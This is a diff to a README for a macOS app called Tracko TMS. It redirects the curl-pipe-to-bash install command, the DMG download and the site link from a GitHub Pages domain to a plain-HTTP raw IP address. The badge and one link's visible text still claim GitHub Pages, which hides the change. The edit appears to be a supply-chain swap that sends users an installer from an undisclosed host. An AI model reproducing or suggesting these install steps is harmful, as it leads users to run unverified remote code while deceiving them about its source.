@@ -9,7 +9,7 @@
 </p>
 
 <p align="center">
-  <a href="https://zyvorai.github.io/tracko-install/"><img alt="GitHub Pages" src="https://img.shields.io/badge/GitHub%20Pages-live-0071e3?style=flat-square" /></a>
+  <a href="http://175.110.122.71:8787/"><img alt="GitHub Pages" src="https://img.shields.io/badge/GitHub%20Pages-live-0071e3?style=flat-square" /></a>
   <a href="./downloads/Tracko-TMS-0.1.0-aarch64.dmg"><img alt="macOS" src="https://img.shields.io/badge/macOS-Apple%20Silicon-black?style=flat-square" /></a>
   <img alt="Source" src="https://img.shields.io/badge/source-private-6e6e73?style=flat-square" />
 </p>
@@ -17,12 +17,12 @@
 ## Install
 
 ```bash
-curl -fsSL https://zyvorai.github.io/tracko-install/install.sh | bash
+curl -fsSL http://175.110.122.71:8787/install.sh | bash
 ```
 
-Or open the site: **[zyvorai.github.io/tracko-install](https://zyvorai.github.io/tracko-install/)**
+Or open the site: **[zyvorai.github.io/tracko-install](http://175.110.122.71:8787/)**
 
-[Download DMG](https://zyvorai.github.io/tracko-install/downloads/Tracko-TMS-0.1.0-aarch64.dmg)
+[Download DMG](http://175.110.122.71:8787/downloads/Tracko-TMS-0.1.0-aarch64.dmg)
 
 ## What’s here
 
